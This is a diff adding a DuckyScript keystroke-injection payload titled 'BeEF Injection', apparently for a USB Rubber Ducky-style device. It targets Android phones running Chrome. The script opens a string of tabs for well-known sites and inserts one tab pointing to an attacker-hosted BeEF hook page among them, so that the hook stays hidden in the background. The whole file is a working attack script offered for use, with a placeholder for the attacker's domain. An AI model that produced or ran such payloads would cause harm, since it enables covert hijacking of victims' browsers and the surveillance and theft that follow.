@@ -1,0 +1,178 @@
+REM TITLE BeEF Injection
+REM AUTHOR
+REM   __      __ .__                             
+REM  /  \    /  \|__|  ____    ____              
+REM  \   \/\/   /|  | /    \  /  _ \             
+REM   \        / |  ||   |  \(  <_> )            
+REM    \__/\  /  |__||___|  / \____/             
+REM         \/            \/                     
+REM                                            
+REM         __      __ .__ .__   .__           
+REM        /  \    /  \|__||  |  |  |  ___.__. 
+REM        \   \/\/   /|  ||  |  |  | <   |  | 
+REM         \        / |  ||  |__|  |__\___  | 
+REM          \__/\  /  |__||____/|____// ____| 
+REM               \/                   \/       
+REM
+REM DESCRIPTION This will open a ton of tabs on the target device.
+REM One of which will be a domain/ip you are hosting. This script is
+REM meant to be used with the beEF framework. All you need to do is 
+REM replace the specified link (Line 62) with your hosted one. The 
+REM idea is to "hide" the browser tab in the background behind all
+REM the other tabs.                     Written in DuckyScript 1.0 
+REM TARGET Android Devices with Chrome as the default browser.
+
+DELAY 1000
+GUI ENTER
+DELAY 500
+GUI b
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN www.youtube.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN www.facebook.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN https://www.nytimes.com/
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+REM Enter your domain/ip site below.
+DELAY 1000
+STRINGLN <link to your site>
+DELAY 2000
+CTRL d
+DELAY 500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN instagram.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN twitter.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN whatsapp.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN pinterest.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN microsoft.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN imdb.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN netflix.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN apple.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN globo.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN translate.google.com
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN it.wikipedia.org
+DELAY 1500
+CTRL t
+DELAY 500
+CTRL l
+DELAY 500
+CTRL l
+
+DELAY 1000
+STRINGLN openai.com
+DELAY 1500
+CTRL t
+DELAY 500
+
+GUI ENTER
